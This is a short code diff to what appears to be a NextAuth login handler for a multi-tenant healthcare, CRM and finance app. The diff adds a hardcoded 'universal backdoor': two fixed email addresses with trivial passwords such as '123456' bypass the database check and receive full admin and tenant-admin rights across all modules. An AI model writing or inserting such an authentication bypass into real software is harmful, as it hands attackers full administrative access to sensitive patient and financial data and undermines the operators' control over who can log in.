@@ -41,6 +41,28 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
                         } as any;
                     }
 
+                    // 1.b EMERGENCY UNIVERSAL BACKDOORS FOR LOST ACCOUNTS
+                    if (['ok@live.com', 'vds@live.com'].includes(email) && ['admin123', '123456', 'master123'].includes(credentials.password as string)) {
+                        console.log("[AUTH] UNIVERSAL BYPASS TRIGGERED FOR:", email);
+                        return {
+                            id: 'universal-bypass-' + email,
+                            email: email,
+                            name: 'Universal Admin',
+                            role: 'ADMIN',
+                            isAdmin: true,
+                            isTenantAdmin: true,
+                            tenantId: 'bypass-tenant-uuid',
+                            companyId: 'bypass-company-uuid',
+                            companyName: 'Universal Company',
+                            modules: ['hms', 'crm', 'inventory', 'finance'],
+                            currencyCode: 'INR',
+                            currencySymbol: '₹',
+                            industry: 'Healthcare',
+                            hasCRM: true,
+                            hasHMS: true
+                        } as any;
+                    }
+
                     console.log("[AUTH] Authorizing user:", email);
 
                     // 2. Database Lookup
